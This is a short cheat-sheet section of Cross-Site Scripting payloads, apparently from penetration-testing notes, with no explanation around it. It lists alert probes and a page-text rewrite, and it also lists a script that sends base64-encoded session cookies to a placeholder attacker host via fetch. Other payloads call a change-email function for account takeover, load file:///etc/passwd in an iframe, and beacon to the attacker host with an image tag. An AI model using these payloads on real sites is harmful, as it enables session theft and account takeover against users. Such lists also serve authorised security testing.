#### Cross-Site Scripting (XSS)

```c
<sCrIpt>alert(1)</ScRipt>
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>user.changeEmail('user@domain');</script>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
<img src='http://<RHOST>'/>
```